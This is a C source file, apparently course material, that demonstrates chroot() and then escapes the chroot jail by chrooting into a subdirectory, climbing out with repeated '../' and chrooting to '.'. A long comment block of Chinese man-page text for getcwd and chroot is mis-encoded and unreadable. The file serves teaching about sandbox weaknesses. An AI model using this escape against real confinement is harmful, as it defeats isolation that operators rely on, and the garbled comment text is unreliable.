// Scott Kuhl
//
// Demonstration of chroot and how to break out of it. Make sure you
// run "./chroot" because most Linux systems have a chroot binary
// installed in a commonly-used path that your shell may use
// instead. On Ubuntu 14.04, the "chroot" program (which calls the
// chroot() function) in /usr/sbin/chroot
//
// For more information, see:
// https://lwn.net/Articles/252794/
// http://www.lst.de/~okir/blackhats/node122.html

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>


/*
���Y�ɡG#include <unistd.h>

�w�q��ơGchar * getcwd(char * buf, size_t size);

��ƻ����Ggetcwd()�|�N��e���u�@�ؿ�������|�ƻs��Ѽ�buf �ҫ����O����Ŷ��A�Ѽ�size ��buf ���Ŷ��j�p�C

�`�G
1�B�b�I�s����ƮɡAbuf �ҫ����O����Ŷ��n�����j�C�Y�u�@�ؿ�������|���r����׶W�L�Ѽ�size �j�p�A�h��^NULL�Aerrno ���ȫh��ERANGE�C
2�B�խY�Ѽ�buf ��NULL�Agetcwd()�|�̰Ѽ�size ���j�p�۰ʰt�m�O����(�ϥ�malloc())�A�p�G�Ѽ�size �]��0�A�hgetcwd()�|�̤u�@�ؿ�������|���r��{�רӨM�w�Ұt�m���O����j�p�A�i�{�i�H�b�ϥΧ����r���Q��free()�����񦹪Ŷ��C

��^�ȡG���榨�\�h�N���G�ƻs��Ѽ�buf �ҫ����O����Ŷ�, �άO��^�۰ʰt�m���r�����. ���Ѫ�^NULL,���~�N�X�s��errno.

�d��
#include <unistd.h>
main()
{
    char buf[80];
    getcwd(buf, sizeof(buf));
    printf("current working directory : %s\n", buf);
}


���Y�ɡG#include <unistd.h>

�w�q��ơGint chroot(const char * path);

��ƻ����Gchroot()�Ψӧ��ܮڥؿ����Ѽ�path �ҫ��w���ؿ��C�u���W�ŨϥΪ̤~���\���ܮڥؿ��A�l�i�{�N�~�ӷs���ڥؿ��C

��^�ȡG�I�s���\�h��^0, ���ѫh��-1, ���~�N�X�s��errno.

���~�N�X�G
1�BEPERM �\�i�v����, �L�k���ܮڥؿ��C
2�BEFAULT �Ѽ�path ���жW�X�i�s���O����Ŷ��C
3�BENAMETOOLONG �Ѽ�path �Ӫ��C
4�BENOTDIR ���|�����ؿ��s�b���o�D�u�����ؿ��C
5�BEACCESS �s���ؿ��ɳQ�ڵ��C
6�BENOMEM �֤߰O���餣���C
7�BELOOP �Ѽ�path ���L�h�Ÿ��s�����D�C
8�BEIO I/O �s�����~�C

�d��
// �N�ڥؿ��אּ/tmp, �ñN�u�@�ؿ�������/tmp 
#include <unistd.h>
main()
{
    chroot("/tmp");
    chdir("/");
}


*/



int main(void)
{
	char *str;
	int  ret;
	char buf[1024];
	str = getcwd(buf, 1024);
	printf("current working directory: %s\n", buf);


	// The file "/Makefile" probably doesn't exist on your computer.
	//struct stat {
	//    dev_t     st_dev;     /* ID of device containing file */
	//    ino_t     st_ino;     /* inode number */
	//    mode_t    st_mode;    /* protection */
	//    nlink_t   st_nlink;   /* number of hard links */
	//    uid_t     st_uid;     /* user ID of owner */
	//    gid_t     st_gid;     /* group ID of owner */
	//    dev_t     st_rdev;    /* device ID (if special file) */
	//    off_t     st_size;    /* total size, in bytes */
	//    blksize_t st_blksize; /* blocksize for file system I/O */
	//    blkcnt_t  st_blocks;  /* number of 512B blocks allocated */
	//    time_t    st_atime;   /* time of last access */
	//    time_t    st_mtime;   /* time of last modification */
	//    time_t    st_ctime;   /* time of last status change */
	//};
	struct stat statBuf;
	
	//int stat(const char *path, struct stat *buf);
	if(stat("./Makefile", &statBuf) == -1)
		perror("stat(Makefile)");
	else {
		printf("found Makefile\n");
		printf("Makefile file size = %ld \n", statBuf.st_size);
	}
	if(chroot(buf) == -1) // make the current directory be /
	{
		perror("chroot");
		printf("Have you tried running this as root?\n");
		exit(EXIT_FAILURE);
	}

	// From this point on, this program will think that the root
	// directory "/" is this directory!
	str = getcwd(buf, 1024);
	printf("current working directory: %s\n", buf);
	// The file "/Makefile" should exist!
	if(stat("./Makefile", &statBuf) == -1)
		perror("stat(Makefile)");
	else
		printf("found Makefile\n");

	/* It is possible to break out of chroot using this approach. This
	 * general approach is not a secret and is documented in the
	 * chroot man page. */
	printf("Breaking out of chroot....\n");
	mkdir("chroot.temp", 0777);
	ret = chroot("chroot.temp"); // Now we are not inside of the new root!?!
	if(ret != 0) {
		printf("\n chroot(\"chroot.temp\") err %d",ret);
		return -1;
	}	
	rmdir("chroot.temp"); // cleanup after ourselves

	str = getcwd(buf, 1024);
	printf("current working directory (escape part 1): %s\n", buf);

	// Try to cd into the real root.
	ret = chdir("../../../../../../../../../../../../../../");
	if(ret != 0) {
		printf("\n chdir(\"../../../../../../../../../../../../../../\") err %d",ret);
		return -1;
	}
	str = getcwd(buf, 1024);
	printf("current working directory (escape part 2): %s\n", buf);

	// Did we get out of the chroot?
	ret = chroot(".");
	if(ret != 0) {
		printf("\n hroot(\".\") err %d",ret);
		return -1;
	}
	str = getcwd(buf, 1024);
	printf("current working directory (escape part 3): %s\n", buf);

	// List the files in this directory so you can verify that we got
	// out.
	printf("listing of files in this directory\n");
	execlp("ls", "/", NULL);
	
	
	//fix not used warning
	ret = ret;
	str = str;
}
